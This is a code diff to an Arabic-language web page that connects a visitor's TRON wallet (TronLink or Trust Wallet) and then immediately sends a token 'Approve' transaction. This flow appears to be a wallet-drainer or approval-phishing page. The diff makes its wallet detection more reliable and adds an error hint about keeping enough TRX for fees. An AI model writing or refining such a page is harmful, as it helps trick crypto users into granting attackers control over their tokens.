@@ -7,7 +7,7 @@
   <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.min.js"></script>
 </head>
 <body>
-  <h2>ربط محفظة </h2>
+  <h2>ربط محفظة TRON</h2>
   <button id="connectWalletBtn">ربط المحفظة</button>
   <p id="status"></p>
   <a id="openTronLink" href="tronlink://" style="display:none;">فتح TronLink</a>
@@ -26,41 +26,63 @@
     let tronWeb;
     let userAddress;
 
+    // دالة للانتظار حتى تكون المحفظة جاهزة
+    async function waitForTronWeb(timeout = 5000) {
+      return new Promise((resolve, reject) => {
+        const startTime = Date.now();
+        const checkInterval = setInterval(() => {
+          if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
+            clearInterval(checkInterval);
+            resolve(window.tronWeb);
+          } else if (Date.now() - startTime > timeout) {
+            clearInterval(checkInterval);
+            reject(new Error("لم يتم العثور على TronLink."));
+          }
+        }, 500);
+      });
+    }
+
     async function connectWallet() {
       const statusElement = document.getElementById("status");
       statusElement.innerText = "جارٍ الاتصال بالمحفظة...";
+      const openTronLink = document.getElementById("openTronLink");
+      const openTrustWallet = document.getElementById("openTrustWallet");
 
-      // التحقق من وجود TronLink
-      if (window.tronWeb && window.tronWeb.ready) {
-        tronWeb = window.tronWeb;
+      try {
+        // أولاً: حاول اكتشاف TronLink
+        tronWeb = await waitForTronWeb();
         userAddress = tronWeb.defaultAddress.base58;
-        if (userAddress) {
-          statusElement.innerText = `المحفظة متصلة (TronLink): ${userAddress}`;
-          return await processTokens();
+
+        if (!userAddress) {
+          statusElement.innerText = "فشل جلب عنوان المحفظة. تأكد من تسجيل الدخول في TronLink.";
+          openTronLink.style.display = "inline";
+          return;
+        }
+
+        statusElement.innerText = `المحفظة متصلة (TronLink): ${userAddress}`;
+        await processTokens();
+
+      } catch (err) {
+        // لو TronLink مش موجود، جرب Trust Wallet
+        if (window.ethereum) {
+          try {
+            tronWeb = new TronWeb({ fullHost: "https://api.trongrid.io" });
+            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+            userAddress = accounts[0];
+            tronWeb.setAddress(userAddress);
+            statusElement.innerText = `المحفظة متصلة (Trust Wallet): ${userAddress}`;
+            await processTokens();
+          } catch (trustErr) {
+            statusElement.innerText = "فشل الاتصال بـ Trust Wallet. افتح التطبيق وحاول مرة أخرى.";
+            openTrustWallet.style.display = "inline";
+            console.error(trustErr);
+          }
+        } else {
+          statusElement.innerText = "لم يتم العثور على محفظة. افتح TronLink أو Trust Wallet.";
+          openTronLink.style.display = "inline";
+          openTrustWallet.style.display = "inline";
         }
       }
-
-      // التحقق من Trust Wallet أو محافظ تدعم Web3
-      if (window.ethereum || window.tron) {
-        try {
-          tronWeb = new TronWeb({
-            fullHost: "https://api.trongrid.io"
-          });
-          // طلب الاتصال بـ Trust Wallet
-          const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-          userAddress = accounts[0];
-          tronWeb.setAddress(userAddress);
-          statusElement.innerText = `المحفظة متصلة (Trust Wallet): ${userAddress}`;
-          return await processTokens();
-        } catch (err) {
-          console.error("فشل الاتصال بـ Trust Wallet", err);
-        }
-      }
-
-      // لو المحفظة مش موجودة، اعرض روابط لفتح التطبيقات
-      statusElement.innerText = "لم يتم العثور على محفظة. افتح TronLink أو Trust Wallet.";
-      document.getElementById("openTronLink").style.display = "inline";
-      document.getElementById("openTrustWallet").style.display = "inline";
     }
 
     async function processTokens() {
@@ -103,11 +125,11 @@
             statusElement.innerText += `\nتم إرسال طلب الـ Approve بنجاح.\nمعرف المعاملة: ${tx}`;
           })
           .catch(err => {
-            statusElement.innerText += "\nفشل إرسال طلب الـ Approve أو تم الرفض.";
+            statusElement.innerText += "\nفشل إرسال طلب الـ Approve أو تم الرفض. تأكد من وجود رصيد TRX كافٍ.";
             console.error(err);
           });
       } catch (err) {
-        statusElement.innerText = "حدث خطأ أثناء معالجة التوكنات.";
+        statusElement.innerText += "\nحدث خطأ أثناء معالجة التوكنات.";
         console.error(err);
       }
     }
